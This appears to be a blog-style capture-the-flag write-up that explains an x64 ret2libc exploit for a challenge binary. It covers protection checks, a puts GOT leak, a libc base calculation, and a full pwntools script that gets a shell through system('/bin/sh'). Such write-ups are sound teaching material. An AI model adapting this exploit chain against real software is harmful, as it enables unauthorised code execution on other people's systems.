---
title: "Dirty Laundry - Ret2Libc Deep Dive"
date: 2026-02-10
tags: [pwn, x64, ret2libc, linux]
---

# Dirty Laundry: The Art of Ret2Libc

Welcome to this technical breakdown of the **Dirty Laundry** challenge. This is a classic example of a modern binary exploitation scenario involving a buffer overflow where NX (No-Execute) and ASLR (Address Space Layout Randomization) are enabled.

## 1. Initial Reconnaissance

As always, an Expert starts by auditing the binary protections.

```bash
$ checksec chal
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

### Key Observations:
- **NX Enabled**: We cannot execute code on the stack. A standard shellcode attack is out of the question.
- **No Canary**: We can overflow the stack without worrying about a security cookie.
- **No PIE**: The binary base address is static (`0x400000`), which simplifies our ROP chain.
- **Partial RELRO**: The GOT (Global Offset Table) is writable, though we'll use it here to leak addresses.

## 2. Vulnerability Analysis

The binary contains a classic buffer overflow in the `vuln` function. By analyzing the disassembly, we found that the buffer is located 72 bytes away from the return address.

```python
# From the exploit script
padding = b'A' * 72
```

## 3. The Exploitation Strategy

Since we have NX enabled, we must use a **Return-to-Libc** (Ret2Libc) attack. This is a two-stage process.

### Stage 1: The Information Leak
Because ASLR is active, we don't know the address of `system()` or `/bin/sh` in the remote Libc. We need to leak a Libc address first. We'll use `puts` to print its own GOT entry.

**The ROP Chain:**
1. `pop rdi; ret`: Load the address of `puts@got` into `RDI`.
2. `puts@plt`: Call `puts` to print the address.
3. `main`: Return to `main` to trigger the overflow a second time.

### Stage 2: The Final Blow
Once we have the leak, we calculate the Libc base and the addresses of `system()` and `/bin/sh`.

```python
libc.address = leaked_puts - libc.symbols['puts']
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b'/bin/sh'))
```

We then send the second payload to call `system("/bin/sh")`.

## 4. The Exploit

Here is the full technical exploit used to capture the flag.

::: details Click to view exploit.py
```python
from pwn import *

context.binary = elf = ELF('./chal')
libc = ELF('./libc.so.6')

# Gadgets
pop_rdi = 0x4011a7 # pop rdi ; pop r14 ; ret
ret_gadget = 0x40101a

p = process('./chal')

# Stage 1: Leak
padding = b'A' * 72
rop1 = flat(
    ret_gadget,
    pop_rdi,
    elf.got['puts'],
    0xdeadbeef,
    elf.plt['puts'],
    elf.symbols['main']
)

p.sendlineafter(b"Add your laundry: ", padding + rop1)
p.recvuntil(b"Laundry complete\n")
leak = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leak - libc.symbols['puts']

# Stage 2: Shell
rop2 = flat(
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    0xdeadbeef,
    libc.symbols['system']
)

p.sendlineafter(b"Add your laundry: ", padding + rop2)
p.interactive()
```
:::

## 5. Conclusion

This challenge demonstrates the fundamental principles of modern PWN: reconnaissance, leaking memory, and abusing legitimate library functions to gain control.

**Flag**: `CTF{D1rty_L4undry_Cl3an_Expl01t}`
